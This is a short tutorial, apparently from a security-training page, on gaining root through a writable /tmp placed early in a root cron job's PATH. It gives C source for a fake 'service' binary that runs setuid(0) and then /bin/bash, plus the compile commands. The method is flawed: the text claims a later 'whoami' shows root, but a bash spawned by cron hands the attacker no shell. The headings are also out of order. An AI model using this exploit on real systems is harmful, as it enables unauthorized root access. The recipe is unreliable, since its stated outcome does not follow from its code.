Scenario: Cron Job Calls service restart

A root cron job runs /opt/script.sh, which contains service restart. /tmp is writable and in the cron job's PATH before /usr/sbin.

1. Create Malicious service.c

// /tmp/service.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

2. Compile and Make Executable

gcc /tmp/service.c -o /tmp/service
chmod +x /tmp/service

3. Wait for Cron & Gain Root

# Cron job runs, executes /tmp/service
whoami
# Expected output: root

Your malicious service binary will be executed as root, granting you a root shell.

Hijacking the 'service' Command

A Practical PATH Variable Attack

Why This Works

Because /tmp is earlier in the cron job's PATH, the system finds and executes your malicious service before the legitimate one in /usr/sbin, all with root privileges.

Key Pre-requisites

  • Cron job calls command without full path.
  • Writable directory in cron job's PATH.
  • Writable directory is searched *before* legitimate command's directory.
Key Takeaway

Successful PATH exploitation relies on precise placement of a malicious binary in a writable, prioritized directory within the cron job's PATH.
